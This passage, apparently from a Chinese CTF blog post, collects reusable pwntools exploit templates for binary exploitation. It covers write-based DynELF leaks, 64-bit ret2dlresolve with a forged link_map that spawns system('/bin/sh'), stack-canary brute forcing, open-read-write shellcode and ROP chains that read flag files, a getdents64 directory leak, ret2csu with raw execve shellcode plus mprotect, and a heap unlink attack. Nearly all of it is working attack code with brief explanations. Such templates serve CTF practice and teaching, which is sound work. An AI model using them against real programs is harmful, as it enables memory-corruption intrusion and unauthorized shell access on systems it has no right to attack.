<p>数据接收那里很容易出问题，并且必须要有“ p.recvuntil(‘xxxx’) ”</p>
<p>因为程序在运行的过程中会输出一些字符串，可能会干扰数据接收的过程</p>
<h2 id="DynELF-基于write的模板"><a href="#DynELF-基于write的模板" class="headerlink" title="DynELF-基于write的模板"></a>DynELF-基于write的模板</h2><p>write比puts友好太多了，这个leak函数也比较简单：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_ret) + p64(addr)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(<span class="number">8</span>)</span><br><span class="line">    payload += p64(write_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p32(write_plt) + p32(ret_address) </span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">4</span>) </span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>配合上面的万能pop，还可以形成更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, addr, <span class="number">1</span>, main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#当然，配合puts也是可以的（puts和write就只有接收部分不同）</span></span><br></pre></td></tr></table></figure>
<p>注意：有些程序自带循环，可以根据具体情况进行修改</p>
<h2 id="ret2dlresolve-64位"><a href="#ret2dlresolve-64位" class="headerlink" title="ret2dlresolve-64位"></a>ret2dlresolve-64位</h2><p>如果题目中给出了libc版本，就可以用这个方法（泄露出libc版本后也行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_linkmap_addr：可以控制的地址</span></span><br><span class="line"><span class="comment">#known_func_ptr：function_got（已知函数的GOT表地址）</span></span><br><span class="line"><span class="comment">#offset：system_got - function_got</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;function&#x27;</span>]  </span><br><span class="line">plt_load = addr(plt[<span class="number">1</span>]) <span class="comment"># dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, function_got ,l_addr)</span><br><span class="line">payload = flat( padding, pop_rdi, <span class="number">0</span>, pop_rsi, bss_stage, <span class="number">0</span>, read_plt, pop_rsi, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, bss_stage + <span class="number">0x48</span>, plt_load, bss_stage, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># “bss_stage+0x48”为&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)  </span><br><span class="line">p.sendline(payload)  </span><br><span class="line">p.send(fake_link_map) </span><br></pre></td></tr></table></figure>
<p>程序先利用read在“bss_stage”中写入了“fake_link_map”</p>
<p>在手动调用dl_runtime_resolve（plt_load），把“bss_stage”和“0”作为参数</p>
<p>执行完成之后，目标函数就会被重定位为“ system(“/bin/sh”) ”</p>
<p>理论上来讲，只要已知了libc版本就可以用这个来打</p>
<h2 id="canary爆破"><a href="#canary爆破" class="headerlink" title="canary爆破"></a>canary爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a:	<span class="comment">#一次性不覆盖全部的canary，而是覆盖1字节</span></span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">canary=<span class="string">&#x27;\x00&#x27;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br></pre></td></tr></table></figure>
<p>这两个’xxxx’写什么是关键，要对比“canary通过”和“canary不通过”程序输出的字符串来填入</p>
<h2 id="ORW（ROP链-shellcode）"><a href="#ORW（ROP链-shellcode）" class="headerlink" title="ORW（ROP链+shellcode）"></a>ORW（ROP链+shellcode）</h2><p><strong>ORW原理：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;gmp.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">	void* bss;</span><br><span class="line">	<span class="built_in">int</span>* fd,mm;</span><br><span class="line">	fd=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	mm=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	bss=malloc(<span class="number">0x90</span>);</span><br><span class="line">	read(<span class="number">3</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	write(<span class="number">1</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	printf(<span class="string">&quot;fd &gt;&gt;%d\n&quot;</span>,fd);</span><br><span class="line">	printf(<span class="string">&quot;mm &gt;&gt;%d\n&quot;</span>,mm);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的“read(3,bss,0x30)”（如果前面已经调用了“open”，可以换成“read(4,bss,0x30)”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ywhkkx&#125;</span><br><span class="line">fd &gt;&gt;<span class="number">3</span></span><br><span class="line">mm &gt;&gt;<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-32</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p>​        // 不管是64位还是32位：“esp”为“./flag”所在地址，根据具体情况进行填写</p>
<p><strong>ROP链-64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload) </span><br><span class="line">flag=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<p>当不知道程序名称时，用“getdents64”进行操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 2)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># open(&quot;.&quot;)[3]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># getdents64(3, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">217</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)[4]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(4,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;.\x00&#x27;</span>) <span class="comment"># read(0, bss_addr, 2) &gt;&gt; open(&quot;.&quot;)</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) <span class="comment"># read(0, bss_addr, 0x30) &gt;&gt; open(&#x27;xxxx&#x27;+flag_s,0)</span></span><br><span class="line">flag_s=p.recv(<span class="number">20</span>)</span><br><span class="line">flag=<span class="string">&#x27;xxxx&#x27;</span>+flag_s</span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<ul>
<li>先用“open(“.”)”打开当前目录</li>
<li>使用“getdents64(3, bss_addr + 0x200, 0x600)”打印目录到“bss_addr + 0x200”</li>
<li>使用“write(1, bss_addr + 0x200, 0x600)”打印目录</li>
<li>选择性接受文件名称（至于怎么接收，就要看程序了）</li>
</ul>
<h2 id="Shellcode模板"><a href="#Shellcode模板" class="headerlink" title="Shellcode模板"></a>Shellcode模板</h2><p><strong>ret2csu</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. read shellcode to bss_addr</span></span><br><span class="line">shellcode=<span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.amd64.linux.sh(),arch=&#x27;amd64&#x27;) </span></span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x400</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. read bss_addr to got[0]</span></span><br><span class="line">shellcode_got= got[<span class="number">0</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(shellcode_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(bss_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. read mprotect_libc to got[1]</span></span><br><span class="line">mprot_got= got[<span class="number">1</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(mprot_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(mprotect_libc))</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, mprot_got, <span class="number">7</span>, <span class="number">0x1000</span>, <span class="number">0x600000</span>, main_addr)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, shellcode_got, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br></pre></td></tr></table></figure>
<p>这种进攻方式的核心就在于：把目标地址写入空白的GOT表</p>
<h2 id="Unlink攻击模板"><a href="#Unlink攻击模板" class="headerlink" title="Unlink攻击模板"></a>Unlink攻击模板</h2><p><strong>基于chunk_list</strong></p>
<p>通常就是这么个造型，根据具体需要进行修改（这种方式高libc版本用不了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk1</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk2</span></span><br><span class="line">alloc(<span class="number">0xa0</span>)	<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">list_addr_chunk2=list_addr+<span class="number">0x10</span> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x18</span>)</span><br><span class="line">payload+=p64(list_addr_chunk2-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xa0</span>)+p64(<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,<span class="number">0xb0</span>,payload) <span class="comment">#fake_chunk2</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#list_addr_chunk2：就是目标chunk(chunk2)的FD指针，通过list_addr比较好寻找</span></span><br><span class="line"><span class="comment">#注意：例题的&quot;chunk[0]&quot;没有写入东西</span></span><br></pre></td></tr></table></figure>
<p>通常都是修改“chunk2”，释放“chunk3”，留一个“chunk1”进行初始化</p>
